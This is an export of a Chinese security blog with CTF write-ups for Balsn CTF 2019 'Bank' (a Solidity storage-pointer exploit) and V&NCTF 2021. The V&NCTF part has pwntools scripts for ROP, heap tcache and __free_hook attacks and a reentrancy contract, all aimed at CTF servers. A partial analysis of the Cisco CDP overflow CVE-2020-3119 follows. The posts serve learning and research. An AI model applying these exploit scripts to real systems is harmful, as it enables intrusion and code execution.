<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Balsn CTF 2019 - Bank 复现笔记]]></title>
    <url>%2F2021%2F03%2F22%2Fbalsnctf2019-bank%2F</url>
    <content type="text"><![CDATA[Balsn CTF 2019 - Bank前几天Retr_0师傅发给我一道区块链题strictmathematician，仔细研究了两三天，学习到了很多新的知识，在此记录一下。由于这道题是pikachu师傅基于Balsn CTF 2019的Bank为原型出的一道题，所以我在pikachu师傅的指点下先去看了Balsn CTF 2019的Bank，以下为复现笔记。（官方wp） Source首先查看题目给出的源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879pragma solidity ^0.4.24;contract Bank &#123; event SendEther(address addr); event SendFlag(address addr); address public owner; // 0 uint randomNumber = RN; // 1 constructor() public &#123; owner = msg.sender; &#125; struct SafeBox &#123; bool done; // 0_0_1 function(uint, bytes12) internal callback; // 0_1_9 bytes12 hash; // 0_9_21 uint value; // 1 &#125; SafeBox[] safeboxes; // 2 struct FailedAttempt &#123; uint idx; // 0 uint time; // 1 bytes12 triedPass; // 2_0_12 address origin; // 2_12_32 &#125; mapping(address =&gt; FailedAttempt[]) failedLogs; // 3 modifier onlyPass(uint idx, bytes12 pass) &#123; if (bytes12(sha3(pass)) != safeboxes[idx].hash) &#123; FailedAttempt info; info.idx = idx; info.time = now; info.triedPass = pass; info.origin = tx.origin; failedLogs[msg.sender].push(info); &#125; else &#123; _; &#125; &#125; function deposit(bytes12 hash) payable public returns(uint) &#123; SafeBox box; box.done = false; box.hash = hash; box.value = msg.value; if (msg.sender == owner) &#123; box.callback = sendFlag; &#125; else &#123; require(msg.value &gt;= 1 ether); box.value -= 0.01 ether; box.callback = sendEther; &#125; safeboxes.push(box); return safeboxes.length-1; &#125; function withdraw(uint idx, bytes12 pass) public payable &#123; SafeBox box = safeboxes[idx]; require(!box.done); box.callback(idx, pass); box.done = true; &#125; function sendEther(uint idx, bytes12 pass) internal onlyPass(idx, pass) &#123; msg.sender.transfer(safeboxes[idx].value); emit SendEther(msg.sender); &#125; function sendFlag(uint idx, bytes12 pass) internal onlyPass(idx, pass) &#123; require(msg.value &gt;= 100000000 ether); emit SendFlag(msg.sender); selfdestruct(owner); &#125;&#125; 内存排布首先需要弄明白的是两个struct结构体SafeBox和FailedAttempt的内存排布，这里我参考了ctf-wiki。 一直以来我对EVM的字节序一直搞不清楚，为了弄清数据在内存或者Storage里每个字节到底是怎么存储的，我查阅了一些资料，然后发现ethervm.io上已经说的非常清楚了：Ethereum VM是大端机器，字长是256-bits，也就是32个字节。所以说，数据总是从低地址开始存储。 举个例子，uint类型的数据0x80，存放在地址为0x40的内存中的情形，如下图所示： 0x80所占的字节数是32字节，MSB是\x00，LSB是\x80，因为EVM是大端机，所以说MSB存储在低地址，也就是MSB从地址0x40开始存储，一直到0x5f地址处的字节为LSB\x80。 对于bytes、string这种类型的变量，首字节也是存放在低地址，然后依次往高地址存储 这里问了pikachu师傅Remix里Storage存储的k-v对前那一串数字是什么含义，原来是key的keccak值，应该是为了方便定位以该Slot为数组的元素实际的存储地址。 1234keccak256(0)=0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563keccak256(1)=0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6w3.keccak(hexstr='290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563')HexBytes('0x510e4e770828ddbf7f7b00ab00a9f6adaf81c0dc9cc85f1f8249c256942d61d9') 根据ctf-wiki，结构体成员总是按slot对齐的，并且在每个slot内部从右到左（从高地址到低地址）紧密排列。官方wp里给出的结构体成员布局： 合约本身的Storage布局123456789-----------------------------------------------------| unused (12) | owner (20) | &lt;- slot 0-----------------------------------------------------| randomNumber (32) | &lt;- slot 1-----------------------------------------------------| safeboxes.length (32) | &lt;- slot 2-----------------------------------------------------| occupied by failedLogs but unused (32) | &lt;- slot 3----------------------------------------------------- FailedAttempt1234567-----------------------------------------------------| idx (32) |-----------------------------------------------------| time (32) |-----------------------------------------------------| origin (20) | triedPass (12) |----------------------------------------------------- SafeBox12345-----------------------------------------------------| unused (11) | hash (12) | callback (8) | done (1) |-----------------------------------------------------| value (32) |----------------------------------------------------- 未初始化的Storage指针在Solidity 0.5.0之前，没有初始化的结构体默认会指向Stroage[0]，而不是指向memory。这一默认的行为在0.5.0之后被取消，变量的存储位置必须被显式地声明为memory或者是storage才可以通过编译。所以说源代码中onlyPass的info变量和deposit的box变量都是指向合约Storage存储的首地址的。这一行为使得我们可以将合约的Storage[0]视为结构体一样来修改，破坏了合约Storage中原有的值。 function type源码中第16行的function(uint, bytes12) internal callback;是我第一次见的用法，在我常用的所有反编译器中都看不到这个变量的用法，而且在solidity文档中也搜索不到，导致我一度认为这个变量是伪变量，不存在实际的操作。 然后自己调试了，调试完后在官方文档里找到了一段对应的描述 Calling an internal function is realized by jumping to its entry label, just like when calling a function of the current contract internally. 这种function类型的变量占据8个字节，就像C语言里的函数指针一样，调用这个变量所指向的函数的时候会使用JUMP指令跳转到该变量所表示的地址上。 如果jump到了非JUMPDEST的指令会发生什么？ 经过调试，会直接停止 调试之前一直用的是Remix套件进行编译和调试，但是调试这个合约的时候运行第一条指令整个Debugger框就没了，想想Remix也不是万能的，不能只会一种工具而产生依赖，于是在tkmk师傅的指导下用geth搭建了自己的私链来调试智能合约交易。 搭建私链参考了网上已有的教程 https://geth.ethereum.org/docs/interface/private-network https://blog.csdn.net/qq_36124194/article/details/83686740 https://www.jianshu.com/p/c0cd7a3ade8b https://blog.csdn.net/kevinyankai/article/details/102562562 https://ethereum.stackexchange.com/questions/1492/when-is-the-geth-ipc-file-produced https://ethereum.stackexchange.com/questions/37972/does-the-latest-version-of-geth-does-not-create-geth-ipc 自己的启动参数，其中networkid和identity都是可以随便填的，–http –http.corsdomain好像是为了后续调试的，没有细究。 1geth --identity "ainevsia" -networkid="35634" --datadir data --nodiscover --http --http.corsdomain "http://localhost:8000" --allow-insecure-unlock console 不想反复unlock自己的账号，用这里的方法。 web3py私链的好处就是自己可以完全掌控整条链，不过我在搭建完私链之后第一个想法就是有没有像etherscan一样的web界面可以让我查交易什么的。搜索一番后，其实是有一些开源的小的web应用的，不过好多都没更新了，网上提到最多的一个我也没安装上，而且看简介功能也很少。询问了tkmk师傅，他是用纯命令行操作的，理论上来说命令行可以完成一切etherscan所支持的操作。 但是我geth默认的console不会用，js调用合约传参都不知道该怎么传指定类型的参数，于是又请教了tkmk师傅，去学习了web3py的api，感觉对我来说web3py确实比web3.js好用的多。 web3py的原理是使用JSON-RPC（remote process communication）协议向节点发送指定的RPC操作，接收节点传回的数据。这里的节点就是我们用geth启动起来的。 列举一些常用的操作 12345678910111213141516171819202122232425262728293031323334353637383940414243from web3 import Web3import jsonfrom datetime import datetimew3 = Web3(Web3.IPCProvider())w3.isConnected() # 确认已经连接上远程节点bytecode='0x' # 粘贴remix编译好的bytecode，前面要加0xs='jsonformatstr' # 粘贴remix编译好的abi 可以先用http://www.bejson.com/jsonviewernew/ 去掉空格什么的abi=json.loads(s)# 合约对象Bank = w3.eth.contract(abi=abi, bytecode=bytecode)# Submit the transaction that deploys the contracttx_hash = Bank.constructor().transact()# 等待被收入block中tx_receipt = w3.eth.waitForTransactionReceipt(tx_hash)# 合约实例bank = w3.eth.contract(address=tx_receipt.contractAddress,abi=abi)# 调用合约方法tx_hash = bank.functions.deposit(b'123456789012').transact(&#123;'gas':1000000,'value':w3.toWei(1,'ether')&#125;)tx_receipt = w3.eth.waitForTransactionReceipt(tx_hash)tx_receipt['status'] # 返回状态，返回0说明可能revert了或者fail了# 拉回tx_hash这笔交易的执行日志a=w3.manager.request_blocking('debug_traceTransaction', [tx_hash])# 过滤日志list(filter(lambda x: x.op=='REVERT',a.structLogs))list(filter(lambda x: x.pc==0x192, a.structLogs))# 显示最近一笔交易的时间print(datetime.fromtimestamp(w3.eth.get_block('latest')['timestamp']))# geth console命令，挖一块block，然后停止miner.start(1); admin.sleepBlocks(1);miner.stop();# 设置默认用户w3.eth.default_account = w3.eth.accounts[0] Debugger我认为只有学会了如何使用调试器去一步步调试一个东西，才能说入门了一个领域，不然怎么知道它最底层的原理呢？ 所以说我刚刚学会了使用w3.manager.request_blocking(&#39;debug_traceTransaction&#39;, [tx_hash])这个api来调试，我才刚刚入门智能合约安全。 这个api是tkmk师傅告诉我的，我网上搜了也搜不到，但确实就是存在的。 写了一个python脚本来提供一个半交互式的单步调试环境，提供了快进到某条指令的功能 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152from web3 import Web3from datetime import datetimeimport jsonclass bcolors: HEADER = '\033[95m' OKBLUE = '\033[94m' OKCYAN = '\033[96m' OKGREEN = '\033[92m' WARNING = '\033[93m' FAIL = '\033[91m' ENDC = '\033[0m' BOLD = '\033[1m' UNDERLINE = '\033[4m'w3 = Web3(Web3.IPCProvider())assert w3.isConnected()# replace with your tx hashtx_hash_str = '0x8481706e0686aa8e22960456a99c45a29a47b189a074c5d981267bc0113100d7'print('[DEBUGing] ' + tx_hash_str)gdb = w3.manager.request_blocking('debug_traceTransaction', [tx_hash_str])trace = gdb.structLogspc = ''tab = 8for state in trace: if pc != '': if state.pc != int(pc, 0x10): # jump until pc continue print(bcolors.WARNING + '--------------------------------------------------------------------' + bcolors.ENDC) print('PC'.ljust(tab) + hex(state.pc)) print('OPCODE'.ljust(tab) + state.op) print(bcolors.OKBLUE + 'STACK' + bcolors.ENDC) for e in state.stack: print(''.ljust(tab) + e) print(bcolors.OKCYAN + 'MEMORY' + bcolors.ENDC) for i, e in enumerate(state.memory): print(hex(0x20 * i).ljust(tab) + e) if len(state.storage) &gt; 0: print(bcolors.OKGREEN + 'STORAGE' + bcolors.ENDC) for k in state.storage: print(' '.ljust(tab - 4) + '┌── ' + k + ' ──┐') print(' '.ljust(tab - 4) + '└─&gt; ' + state.storage[k] + ' &lt;─┘') pc = input('&gt; ') if pc == 'q': breakprint('[+] Transaction status: ' + str(w3.eth.waitForTransactionReceipt(tx_hash_str)['status'])) Exploit所以说这道题的问题就在与未初始化的Storage指针，导致我们可以在对应的safeboxes数组和FailedAttempt数组的push操作执行之前对stroage进行一番操作。 但是仅仅对slot[0] slot[1] slot[2]进行修改是没有什么作用的，因为push上去的永远都是本次操作所期望的值，我们必须要通过对slot[0] slot[1] slot[2]进行修改产生更加大的影响。 这一道题非常巧妙的一点在于slot[2]这个位置刚好就是safeboxes数组的长度字段，我们可以通过FailedAttempt数组来将slot[2]改为一个非常大的数值，这样safeboxes数组可以索引到的位置就向后发生了延伸，和FailedAttempt数组的前几个结构体发生了重叠。 我们通过在FailedAttempt数组提前布局好伪造的safebox结构体，就可以通过safeboxes数组索引到该结构体并执行对应位置的代码。 实例分析攻击者地址0xe2aD27f6079866683a6eD2dF8D7bEa81FA6B19a0 Calculate target = keccak256(keccak256(msg.sender||3)) + 2计算.FailedAttempt 起始地址，+2是发生重叠的地址0x8e40412da029db6c7a0bad33ca5eeb9582fc94c26e3877c561efdc9c03dae65c + 20x8e40412da029db6c7a0bad33ca5eeb9582fc94c26e3877c561efdc9c03dae65e Calculate base = keccak256(2).计算safebox起始地址0x405787fa12a823e0f2b7631cc41b3ba8828b3321ca811111fa75cd3aa3bb5ace Calculate idx = (target - base) // 2.0x26f45c99c6c0dbc5c3aa250b8321d7f68038b0d051dbb359b3bd07b0b00fc5c8 If (target - base) % 2 == 1, then idx += 2, and do step 7 twice. This happens when the triedPass of the first element of failedLogs does not overlap with the callback variable, so we choose the second element instead.(nop) If (msg.sender &lt;&lt; (12*8)) &lt; idx, then choose another player account, and restart from step 1. This happens when the overwritten length of safeboxes is not large enough to overlap with failedLogs.(nop) Call deposit(0x000000000000000000000000) with 1 ether.满足safeboxes数组有一个元素，可以进入onlyPass Call withdraw(0, 0x111111111111110000070f00).进入onlyPass布置callback指针 Call withdraw(idx, 0x000000000000000000000000), and the SendFlag event will be emitted.执行callback指针 感谢 Retr_0 tkmk pikachu 总结后续希望能够阅读geth的源码深入了解EVM的许多细节。]]></content>
      <tags>
        <tag>Blockchian CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[V&NCTF 2021 Writeup]]></title>
    <url>%2F2021%2F03%2F15%2Fvnctf2021%2F</url>
    <content type="text"><![CDATA[by Ainevsia 这次比赛就做出来了一道pwn题和区块链的题目，另外的三道pwn没有什么思路，XD。 把做出来的两道简单记录一下。 hh / Pwn自定义虚拟机题目，加了seccomp，除了execve其他syscall都可以。 12345678910line CODE JT JF K================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x05 0xc000003e if (A != ARCH_X86_64) goto 0007 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x00 0x01 0x40000000 if (A &lt; 0x40000000) goto 0005 0004: 0x15 0x00 0x02 0xffffffff if (A != 0xffffffff) goto 0007 0005: 0x15 0x01 0x00 0x0000003b if (A == execve) goto 0007 0006: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0007: 0x06 0x00 0x00 0x00000000 return KILL 一开始想错了，想用他实现的printf进行libc泄露的，但是算了一下sp往上推的时候是会覆盖到原来的值的，sp也之只能是连续变化的，不会跳变，所以这种思路不行。 后来发现有oob 123456case 0xDu: // assign v11 = ins_ptr++; data_offset = ins_buf[v11]; val_offset = sptr--; mem[data_offset] = stack[val_offset]; // oob write break; OOB 改rip泄漏libc，ROP执行open read write 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889#!/usr/bin/pythonfrom pwn import *context.log_level=logging.DEBUGcontext.terminal=['tmux','new-window']context.arch='amd64'LOCAL=0if LOCAL: p=process('./hh')else: p=remote('node3.buuoj.cn',26279) def loadbuf(content: [int]): p.sendlineafter(':\n','1') p.sendlineafter('code:',flat(content,word_size=32))def execute(): p.sendlineafter(':\n','2')pop_rdi_ret = 0x00000000004011a3puts_plt = 0x4006F0start = 0x400750puts_got = 0x601FA8push = 0x9jmpz = 0x8puts = 0xeassn = 0xdins = [push, pop_rdi_ret] # first pop rdiins += [assn, (0x1f50 + 0x8) // 4] # offset to saved ripins += [push, 0]ins += [assn, (0x1f50 + 0x8 + 4) // 4]ins += [push, puts_got]ins += [assn, (0x1f50 + 0x10) // 4] # value of rdiins += [push, 0]ins += [assn, (0x1f50 + 0x10 + 4) // 4]ins += [push, puts_plt]ins += [assn, (0x1f50 + 0x18) // 4] # call putsins += [push, 0]ins += [assn, (0x1f50 + 0x18 + 4) // 4]ins += [push, start]ins += [assn, (0x1f50 + 0x20) // 4] # replayins += [push, 0]ins += [assn, (0x1f50 + 0x20 + 8) // 4]loadbuf(ins)execute()gidx = (0x1f50 + 0x8) // 4gins = []def appendrop(val: int): global gidx, gins gins += [push, val &amp; 0xffffffff] gins += [assn, gidx] gidx += 1 gins += [push, (val &gt;&gt; 32) &amp; 0xffffffff] gins += [assn, gidx] gidx += 1base=u64(p.recvline().rstrip().ljust(8,b'\x00'))-0x6f6a0bufbase = 0x602060open_ = base + 0xf70f0read_ = base + 0xf7310write = base + 0xf7370pop_rsi_ret = base + 0x00000000000202f8 pop_rdx_ret = base + 0x0000000000001b92 lst = [pop_rdi_ret, bufbase + 0x264, pop_rsi_ret, 0, open_]lst += [pop_rdi_ret, 3, pop_rsi_ret, bufbase, pop_rdx_ret, 0x40, read_]lst += [pop_rdi_ret, 1, pop_rsi_ret, bufbase, pop_rdx_ret, 0x40, write]for i in lst: appendrop(i) # attach(p,'b *0x401083\nc')gins += [16, int.from_bytes(b'flag', 'little') ,0]loadbuf(gins)execute()p.interactive() catcatcat / Blockchaincontract-library上反编译出的结果真的挺好看的。 反编译结果贴一下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687// Decompiled at www.contract-library.com// 2021.03.14 02:43 UTC// Data structures and variables inferred from the use of storage instructionsmapping (uint256 =&gt; [uint256]) owner_0; // STORAGE[0x0]mapping (uint256 =&gt; [uint256]) _value; // STORAGE[0x1]mapping (uint256 =&gt; [uint256]) _done; // STORAGE[0x2]function 0x74772eb3(uint256 varg0) public nonPayable &#123; return 0xff &amp; owner_0[varg0];&#125;function done(address _owner) public nonPayable &#123; return 0xff &amp; _done[_owner];&#125;function transfer(address receiver, address dede) public nonPayable &#123; require(0xff &amp; _done[receiver] == 0); require(0xff &amp; _done[address(0xffffffffffffffffffffffffffffffffffffffff &amp; dede)] == 1); _done[receiver] = 0x1 | ~0xff &amp; _done[receiver]; _done[address(0xffffffffffffffffffffffffffffffffffffffff &amp; dede)] = 0x0 | ~0xff &amp; _done[address(0xffffffffffffffffffffffffffffffffffffffff &amp; dede)];&#125;function check(address gem) public nonPayable &#123; v0 = 0x666(gem); return v0;&#125;function 0x666(uint256 varg0) private &#123; require(msg.sender &amp; 0xff == 33); v0 = address(varg0); return _value[v0];&#125;function fallback() public payable &#123; revert();&#125;function 0x39b4b0d6() public nonPayable &#123; require(0xff &amp; _done[msg.sender] == 0); require(msg.sender.code.size); v0, v1 = msg.sender.bet().gas(msg.gas); if (v0) &#123; require(RETURNDATASIZE() &gt;= 32); if (v1 == block.blockhash(block.number - 1) % 99) &#123; _value[msg.sender] = _value[msg.sender] + 1000; _done[msg.sender] = 0x1 | ~0xff &amp; _done[msg.sender]; &#125; exit; &#125;&#125;function 0x4804a623() public nonPayable &#123; v0 = 0x666(msg.sender); require(v0 &gt;= 2000); owner_0[msg.sender] = 0x1 | ~0xff &amp; owner_0[msg.sender];&#125;function value(address varg0) public nonPayable &#123; return _value[varg0];&#125;// Note: The function selector is not present in the original solidity code.// However, we display it for the sake of completeness.function __function_selector__(uint32 function_selector) public payable &#123; MEM[64] = 128; if (msg.data.length &gt;= 4) &#123; if (0x39b4b0d6 == function_selector) &#123; 0x39b4b0d6(); &#125; else if (0x4804a623 == function_selector) &#123; 0x4804a623(); &#125; else if (0x69f9d91c == function_selector) &#123; value(address); &#125; else if (0x74772eb3 == function_selector) &#123; 0x74772eb3(); &#125; else if (0x7be8f86b == function_selector) &#123; done(address); &#125; else if (0xba45b0b8 == function_selector) &#123; transfer(address,address); &#125; else if (0xc23697a8 == function_selector) &#123; check(address); &#125; &#125; fallback();&#125; 0x39b4b0d6这个函数可以重入，因为再调用外部函数之前没有把_done提前修改掉。 合约地址必须要以0x21结尾，用下面这个脚本生成一个。 123456789101112131415161718import blocksmithfrom Crypto.Hash import keccakwhile True: kg = blocksmith.KeyGenerator() kg.seed_input('') key = kg.generate_key() address = blocksmith.EthereumWallet.generate_address(key) checksum_address = blocksmith.EthereumWallet.checksum_address(address) pay = b'\xd6\x94' + bytes.fromhex(address[2:]) + b'\x80' contract_addr = '0x' + keccak.new(digest_bits=256).update(pay).hexdigest()[-40:] if contract_addr[-2:] == '21': print(key) print(checksum_address) print(contract_addr) break 攻击合约 123456789101112131415161718192021222324252627282930313233343536373839pragma solidity ^0.6.0;contract Hacker &#123; address payable owner ; bool has_called = false; address target = 0xAEa0714A8793E2684DE7F508577d7EC3F40F283a; constructor () public &#123; owner = msg.sender; &#125; function bet() public returns (uint) &#123; if (has_called == false) &#123; has_called = true; target.call(abi.encode(bytes4(0x39b4b0d6))); return ((uint256)(blockhash(block.number - 1))) % 99; &#125; else &#123; return ((uint256)(blockhash(block.number - 1))) % 99; &#125; &#125; function getflag() public &#123; target.call(abi.encode(bytes4(0x4804a623))); // getflag &#125; function attack() public &#123; target.call(abi.encode(bytes4(0x39b4b0d6))); // Reentrancy &#125; function destruct() public &#123; require(msg.sender == owner, "not valid owner"); selfdestruct(owner); &#125; &#125; 赛后做出来的题White Give Flag出题人说这道题是白给题，不提供libc说明不需要libc。 利用read遇到EOF返回0，read大整数返回负数，进行泄露已经读入程序内存的flag 123456789101112131415161718192021222324252627282930313233343536373839404142434445#!/usr/bin/pythonfrom pwn import *context.log_level=logging.INFOcontext.terminal=['tmux','new-window']context.arch='amd64'LOCAL=0while True: if LOCAL: p=process('./White_Give_Flag') else: p=remote('node4.buuoj.cn',39123) def add(size: int): p.sendlineafter('choice:','') p.sendlineafter('size:\n',str(size)) def edit(idx: int): p.sendlineafter('choice:','xxx') p.sendafter('index:\n',str(idx)) p.sendafter('Content:\n',b'x'*0x10) def delete(idx: int): p.sendlineafter('choice:','xx') p.sendlineafter('index:\n',str(idx)) add(0x330) add(0x330) add(0x330) add(0x310) # attach(p,'b *$rebase(0x1221)\nb *$rebase(0x11E7)') # pause() edit(3) p.shutdown('send') p.recvuntil(b'x'*0x10) res=p.recvline() if b'ctf' in res: print(res) break p.close() # break Little Red Flower比赛的时候不会做，赛后复现 梳理函数流程： 加入seccomp，ban了execve，libc的地址已知。 malloc 0x200大小的chunk 给了任意地址写1字节的能力 chunk偏移unsigned int的offset oob 写8字节 （显然是top chunk）— 为了让我们在合适的地方布置一个合适的指针。 malloc 0x1000-0x2000 的chunk， read读入，然后free Ubuntu GLIBC 2.30-0ubuntu2.2 main函数无法正常return，根据wp，需要在free之前就劫持free_hook。 之后要做open read write 利用的思路是将TCACHE_MAX_BINS设置成一个非常大的数，那么malloc的时候如果对应的count不会零就会从之后越界的地址上返回一个指针给我们。 这道题学会的最亮点的东西是劫持freehook 迁移栈rop 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#!/usr/bin/pythonfrom pwn import *context.log_level=logging.DEBUGcontext.terminal=['tmux','new-window']context.arch='amd64'LOCAL=0if LOCAL: p=process('./pwn')else: p=remote('node3.buuoj.cn',26963) p.recvuntil('GIFT: 0x')base=int(p.recvline().rstrip().decode(),0x10)-0x00000000001eb6a0p.success('base: '+hex(base))free_hook=base+0x00000000001edb20mp_=base+(0x7ffff7fc2280-0x7ffff7dd8000)tcache_bins=mp_+80p.success('free_hook: '+hex(free_hook))# step 1 attack TCACHE_MAX_BINSp.sendafter('anywhere\n',p64(tcache_bins+7))p.sendafter('what?\n',p8(0xff))size=0x14a0-0x8offset=0x555555759ad0-0x5555557592a0 # target ptr address - chunk start addressp.success('offset: '+hex(offset))# prepare a free chunk at __free_hookp.sendlineafter('Offset:\n',str(offset))p.sendafter('Content:\n',p64(free_hook))# next malloc returns __free_hookp.sendlineafter('size:\n',str(size))call_rdi_plus_0x20=base+0x0000000000034fd5 # mov rax, qword ptr [rdi + 0x20] ; mov rbp, rdi ; call raxleave=base+0x000000000005a9a8 # leave ; retpop3=base+0x0000000000026bad # pop r13 ; pop r14 ; pop r15 ; retdata=base+(0x7ffff7fc2000-0x7ffff7dd8000)open_=base+0x0000000000110f10read=base+0x00000000001111f0write=base+0x0000000000111290pop_rdi=base+0x0000000000026bb2 pop_rsi=base+0x000000000002709c pop_rdx_r12=base+0x000000000011c3b1 # attach(p,'b *0x7ffff7e0cfd5')payload=[call_rdi_plus_0x20,pop3,int.from_bytes(b'flag','little'),0,leave]payload+=[pop_rdi,free_hook+0x10,pop_rsi,0,open_]payload+=[pop_rdi,3,pop_rsi,data,pop_rdx_r12,0x100,0,read]payload+=[pop_rdi,1,pop_rsi,data,pop_rdx_r12,0x100,0,write]p.sendlineafter('&gt;&gt;',flat(payload))p.interactive() ff非常明显的uaf，有悬挂指针存在 不得不说，真的好巧妙啊！ 进攻tcache_perthread_struct，来获得libc泄露的方法++ 牛皮！ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384#!/usr/bin/pythonfrom pwn import *context.log_level=logging.INFOcontext.terminal=['tmux','new-window']context.arch='amd64'LOCAL=1if LOCAL: p=process('./pwn')else: p=remote('node3.buuoj.cn',28129) def add(size, content=b'a'): p.sendlineafter('&gt;&gt;','1') p.sendlineafter('Size:\n',str(size)) p.sendafter('Content:\n',content)def delete(): p.sendlineafter('&gt;&gt;','2')def show(): p.sendlineafter('&gt;&gt;','3')def edit(content): p.sendlineafter('&gt;&gt;','5') p.sendafter('Content:\n',content)add(0x70)delete()show() # use the only show to leak the tcache_perthread_struct address (heapbase)heapbase=u64(p.recv(8))&lt;&lt;12tcache=heapbase+0x10edit(flat([0,0])) # use the first edit to clear the key of tcache so we can double freedelete()edit(flat([tcache^(heapbase&gt;&gt;12),tcache])) # use the second edit to point fd -&gt; tcache_perthread_structadd(0x70)# we are going to free tcache_perthread_struct (size 0x290)# so first mark tcache[0x290] to 7 to prevent it falling into tcache bin# instead, freeing tcache_perthread_struct will fall into unsorted binpayload=b'\x00\x00'*(0x29-2)+b'\x07\x00'add(0x70,payload)delete()# now mallocing from tcache_perthread_struct# Due to 0x20 0x30 0x40 's counts field is overwritten by a libc address, we can only malloc 0x50 size chunk# mark tcache[0x50] to 1 and tcache[0x80] to 1add(0x48,(b'\x00\x00'*3+b'\x01\x00'+b'\x00\x00'*2+b'\x01\x00').ljust(0x48,b'\x00'))# Next alloc 0x40 chunkadd(0x38,b'\x00'*0x38)add(0x18,p64(0)+b'\xc0\x16') # 0x7ffff7fc16c0 &lt;_IO_2_1_stdout_&gt;# now 0x50 [ 1]: 0x7ffff7fc16c0 (_IO_2_1_stdout_) ◂— 0xfbad2887# points to _IO_2_1_stdout_# malloc 0x50 chunkadd(0x48,p64(0xfbad1800)+p64(1)*3+b'\x00')base=u64(p.recv(8))-(0x7ffff7fc1744-0x7ffff7ddd000)p.success('base:'+hex(base))system=base+(0x7ffff7e2d3c0-0x7ffff7ddd000)free_hook=base+(0x7ffff7fc3e40-0x7ffff7ddd000)# stdout behavior changes ?def add(size, content=b'a'): p.sendlineafter('&gt;&gt;','1') p.sendlineafter('Size:',str(size)) p.sendafter('Content:',content)# attack free_hook to systemadd(0x28,p64(free_hook))add(0x78,p64(system))# attach(p,'b malloc\nb free\n')# shootadd(0x18,b'/bin/sh\x00')delete()# need brute forcep.interactive()]]></content>
      <tags>
        <tag>CTF Pwn Blockchain</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2020-3119 分析与调试]]></title>
    <url>%2F2021%2F03%2F12%2FCVE-2020-3119%2F</url>
    <content type="text"><![CDATA[漏洞介绍CVE-2020-3119是Armis Labs在2020年2月5日公开的一个Cisco CDP协议的缓冲区溢出漏洞，成功利用的情况下可以远程执行代码。 漏洞发生在Cisco NX-OS上，NX-OS是思科自研的网络设备操作系统，基于Linux内核（Wind River Linux）开发，运行在在思科的Nexus系列数据中心以太网交换机上。本次漏洞影响到Nexus 3000和Nexus 9000系列的所有交换机。 在我着手进行分析之前，知道创宇404实验室的Hcamael师傅已经写了一篇该漏洞的分析文章，对该漏洞进行了深入的分析，本文的所有内容都是建立在这篇分析文章的基础上。 CDP协议是思科专用的设备发现协议，能够运行在大部分的思科设备上面，思科设备能够在与它们直连的设备之间分享有关操作系统软件版本、IP地址、硬件平台等相关信息，是工作在链路层（二层）的协议。该协议的目的MAC地址固定，为01-00-0c-cc-cc-cc，与CDP共用这一地址的还有其他的一些协议。 根据Armis Labs的研究，经过路由器的所有二层网络报文首先都会被l2fwdr进程解析，再去除物理层报文的一些基础分装后通过mts_queue分发给各个处理不同协议的进程。本次漏洞是CDP的协议，所以我们要具体进行分析的程序是cdpd这个守护进程。 cdpd的二进制文件虽然自己不带符号信息，但是程序在运行的时候打了大量的log，详细到每进行一个操作就会有对应的日志记录函数，从这些日志中可以轻松恢复出绝大部分的函数名。如下面这个函数的截图所示，可以从函数日志中恢复出该函数的函数名为cdpd_get_domainname。（但是在逆向分析的过程中会发现有些重要的宏函数或者是inline函数被编译之后嵌入到了其他的函数体当中了。） 根据Armis Labs发布的漏洞分析，找到了该漏洞存在于cdpd_poe_handle_pwr_tlvs函数，相关的漏洞代码如下（截取有关片段）： 12345678910111213141516171819202122232425262728293031char __cdecl cdpd_poe_handle_pwr_tlvs(int *a1, int a2, struct pwr_req *pwr_pkt_2) &#123; ... int temp[16]; ... if ( a2 || pwr_pkt_2 ) &#123; // CDP Version 2 ... if ( pwr_pkt_2 ) &#123; length = __ROR2__(pwr_pkt_2-&gt;length, 8); // big-endian to small-endian req_id = __ROR2__(pwr_pkt_2-&gt;request_id, 8); mgmt_id = __ROR2__(pwr_pkt_2-&gt;management_id, 8); ... off_lst_start = length - 8; num_levels = (unsigned int)off_lst_start &gt;&gt; 2;// divied sizeof(int) = / 4 ... if ( num_levels ) &#123; current_offset = pwr_pkt_2-&gt;power_requested; counter = 1; do &#123; pwr_levels_requested = counter - 1; temp[counter - 1] = *current_offset; ... a1[counter + 310] = large_buff[counter + 254]; // a1 dereferenced ++current_offset; ++counter; &#125; while ( counter != num_levels + 1 ); &#125; ... &#125; &#125;&#125; cdpd_poe_handle_pwr_tlvs函数的第三个参数pwr_pkt_2是一个指向cdp报文中Power Request开始的一个结构体指针，下图中就是指向0x9aPower Request开始的地方。同时我们也可以用wireshark了解到每一个字段的长度，type字段占用两个字节（0x0019），Length字段占用两个字节（0x84=132），request-id和managem-id都占用2个字节（0x6161=24929），然后就是每个长度4字节的Power Request数组。 在IDA中定义这个结构体相应的成员。 cdpd_poe_handle_pwr_tlvs函数在第一个if分支处理Version 1的情况，然后进入第二个分支处理Version 2的情况，然后在pwr_pkt_2指针不为空的情况下，将报文中length、req_id、mgmt_id三个字段从网络字节序转换成主机字节序，然后计算Power Request数组的长度off_lst_start，利用off_lst_start除以4的方法得到这个数组元素的个数num_levels。此时num_levels使用cdp报文中的length字段计算得到的，也就是说，是用户可控的。 然后进入一个num_levels次的循环，每次循环会将pwr_pkt_2中的一个int的数据拷贝到本地的数组temp中。 点击temp变量可以看到其在栈中相对当前函数栈底的位置，它正好是这个函数最底部的变量，并且没有启用栈cookie，距离保存的ebp的偏移是0x40也就是16个int变量的距离（0x4 / 4 = 0x10）。 